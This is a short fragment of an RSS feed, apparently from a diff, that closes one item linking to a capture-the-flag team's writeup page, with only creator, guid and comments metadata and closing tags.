+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">59 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/59#comments</comments>
+</item>
+</channel>
+</rss>
